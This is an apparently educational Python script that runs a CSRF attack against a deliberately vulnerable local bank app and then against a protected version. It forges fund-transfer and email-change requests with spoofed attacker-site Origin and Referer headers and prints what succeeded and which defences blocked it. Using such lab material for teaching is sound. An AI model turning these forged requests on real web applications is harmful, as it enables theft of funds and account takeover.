#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin
from colorama import init, Fore, Style
import time

# Initialize colorama for colored output
init()

# Configuration
VULNERABLE_URL = "http://127.0.0.1:5000"
SECURE_URL = "http://127.0.0.1:5001"

def print_banner():
    """Print the script banner."""
    banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════╗
║                    CSRF ATTACK DEMONSTRATION                   ║
║                   Educational Purposes Only                    ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def print_section(title):
    """Print a section header."""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f" {title}")
    print(f"{'='*60}{Style.RESET_ALL}\n")

def print_success(message):
    """Print a success message."""
    print(f"{Fore.GREEN}[✓] {message}{Style.RESET_ALL}")

def print_error(message):
    """Print an error message."""
    print(f"{Fore.RED}[✗] {message}{Style.RESET_ALL}")

def print_info(message):
    """Print an info message."""
    print(f"{Fore.YELLOW}[i] {message}{Style.RESET_ALL}")

def print_attack(message):
    """Print an attack message."""
    print(f"{Fore.MAGENTA}[⚡] {message}{Style.RESET_ALL}")


class CSRFAttackDemo:
    """Demonstrates CSRF attack against vulnerable and secure applications."""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.logged_in = False
    
    def check_server(self):
        """Check if the target server is running."""
        try:
            response = self.session.get(self.target_url, timeout=5)
            return response.status_code == 200
        except requests.exceptions.ConnectionError:
            return False
    
    def login(self, username, password):
        """Login to the application and establish a session."""
        print_info(f"Attempting to login as '{username}'...")
        
        login_url = urljoin(self.target_url, "/login")
        data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(login_url, data=data, allow_redirects=True)
        
        if 'dashboard' in response.url or 'Dashboard' in response.text:
            print_success(f"Successfully logged in as '{username}'")
            self.logged_in = True
            return True
        else:
            print_error(f"Login failed for '{username}'")
            return False
    
    def get_balance(self):
        """Get the current account balance."""
        api_url = urljoin(self.target_url, "/api/balance")
        try:
            response = self.session.get(api_url)
            if response.status_code == 200:
                data = response.json()
                return data.get('balance', 'Unknown')
        except:
            pass
        
        # Fallback: parse from dashboard
        dashboard_url = urljoin(self.target_url, "/dashboard")
        response = self.session.get(dashboard_url)
        if '$' in response.text:
            import re
            match = re.search(r'\$(\d+(?:,\d{3})*(?:\.\d{2})?)', response.text)
            if match:
                return float(match.group(1).replace(',', ''))
        return 'Unknown'
    
    def csrf_transfer_attack(self, recipient, amount):
        """
        Execute CSRF transfer attack.
        
        This simulates what happens when a victim visits a malicious page
        that submits a hidden form to the vulnerable bank.
        """
        print_attack(f"Executing CSRF attack: Transfer ${amount} to '{recipient}'")
        
        transfer_url = urljoin(self.target_url, "/transfer")
        
        # Malicious payload - NO CSRF token!
        payload = {
            'recipient': recipient,
            'amount': amount
        }
        
        # Simulate cross-site request (different origin)
        # In a real attack, this would come from attacker's domain
        headers = {
            'Origin': 'http://evil-attacker-site.com',
            'Referer': 'http://evil-attacker-site.com/fake-prize.html'
        }
        
        print_info(f"POST {transfer_url}")
        print_info(f"Payload: {payload}")
        print_info(f"Headers: {headers}")
        
        response = self.session.post(
            transfer_url, 
            data=payload, 
            headers=headers,
            allow_redirects=True
        )
        
        return response
    
    def csrf_email_change_attack(self, new_email):
        """
        Execute CSRF email change attack.
        
        This attack changes the victim's email to attacker's email,
        potentially enabling account takeover via password reset.
        """
        print_attack(f"Executing CSRF attack: Change email to '{new_email}'")
        
        settings_url = urljoin(self.target_url, "/settings")
        
        payload = {
            'email': new_email,
            'new_password': ''
        }
        
        headers = {
            'Origin': 'http://evil-attacker-site.com',
            'Referer': 'http://evil-attacker-site.com/fake-survey.html'
        }
        
        response = self.session.post(
            settings_url,
            data=payload,
            headers=headers,
            allow_redirects=True
        )
        
        return response


def demo_vulnerable_app():
    """Demonstrate attack against vulnerable application."""
    print_section("ATTACK ON VULNERABLE APPLICATION (Port 5000)")
    
    attacker = CSRFAttackDemo(VULNERABLE_URL)
    
    # Check if server is running
    if not attacker.check_server():
        print_error("Vulnerable server not running!")
        print_info("Start it with: python vulnerable_bank.py")
        return False
    
    print_success("Vulnerable server is running")
    
    # Step 1: Login as victim (Alice)
    print_info("\n--- Step 1: Victim (Alice) logs into her bank ---")
    if not attacker.login('alice', 'alice123'):
        return False
    
    # Step 2: Check initial balance
    print_info("\n--- Step 2: Check Alice's initial balance ---")
    initial_balance = attacker.get_balance()
    print_info(f"Alice's balance: ${initial_balance}")
    
    # Step 3: Execute CSRF attack (transfer money)
    print_info("\n--- Step 3: Alice visits malicious website ---")
    print_info("The malicious site secretly submits a transfer form...")
    time.sleep(1)
    
    response = attacker.csrf_transfer_attack('bob', 500)
    
    # Step 4: Check if attack succeeded
    print_info("\n--- Step 4: Verify attack result ---")
    
    if 'Successfully transferred' in response.text or response.status_code == 200:
        final_balance = attacker.get_balance()
        print_success(f"CSRF ATTACK SUCCEEDED!")
        print_success(f"Balance before: ${initial_balance}")
        print_success(f"Balance after: ${final_balance}")
        print_success(f"$500 was stolen and transferred to 'bob'!")
    else:
        print_error("Attack may have failed")
        print_info(f"Response status: {response.status_code}")
    
    # Step 5: Email change attack
    print_info("\n--- Step 5: Execute email change attack ---")
    response = attacker.csrf_email_change_attack('attacker@evil.com')
    
    if response.status_code == 200:
        print_success("Email changed to attacker@evil.com!")
        print_success("Attacker can now use 'Forgot Password' to take over account!")
    
    return True


def demo_secure_app():
    """Demonstrate failed attack against secure application."""
    print_section("ATTACK ON SECURE APPLICATION (Port 5001)")
    
    attacker = CSRFAttackDemo(SECURE_URL)
    
    # Check if server is running
    if not attacker.check_server():
        print_error("Secure server not running!")
        print_info("Start it with: python secure_bank.py")
        return False
    
    print_success("Secure server is running")
    
    # Login as victim
    print_info("\n--- Step 1: Victim (Alice) logs into secure bank ---")
    if not attacker.login('alice', 'alice123'):
        return False
    
    initial_balance = attacker.get_balance()
    print_info(f"Alice's balance: ${initial_balance}")
    
    # Attempt CSRF attack
    print_info("\n--- Step 2: Attempting CSRF attack ---")
    response = attacker.csrf_transfer_attack('bob', 500)
    
    # Check result
    print_info("\n--- Step 3: Verify attack result ---")
    
    if response.status_code == 403:
        print_success("CSRF ATTACK BLOCKED!")
        print_success("Server returned 403 Forbidden")
        print_info("CSRF token validation prevented the attack")
    elif 'CSRF' in response.text or 'token' in response.text.lower():
        print_success("CSRF ATTACK BLOCKED!")
        print_info("Missing or invalid CSRF token")
    else:
        final_balance = attacker.get_balance()
        if final_balance == initial_balance:
            print_success("Attack had no effect - balance unchanged")
        else:
            print_error("Unexpected result - please check manually")
    
    return True


def main():
    """Main entry point."""
    print_banner()
    
    print_info("This script demonstrates CSRF attacks against:")
    print_info("  1. A vulnerable application (no CSRF protection)")
    print_info("  2. A secure application (with CSRF protection)")
    print()
    
    # Demo against vulnerable app
    demo_vulnerable_app()
    
    print("\n" + "="*60 + "\n")
    
    # Demo against secure app
    demo_secure_app()
    
    # Summary
    print_section("SUMMARY")
    print(f"""
{Fore.GREEN}Key Findings:{Style.RESET_ALL}
    
1. {Fore.RED}Vulnerable Application:{Style.RESET_ALL}
   • No CSRF tokens in forms
   • No SameSite cookie attribute
   • No Origin/Referer validation
   • Attack: SUCCESS ✓
    
2. {Fore.GREEN}Secure Application:{Style.RESET_ALL}
   • CSRF tokens in all forms
   • SameSite=Strict cookie attribute
   • Origin/Referer validation
   • Attack: BLOCKED ✗
    
{Fore.YELLOW}Lesson:{Style.RESET_ALL} Always implement CSRF protection!
    """)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
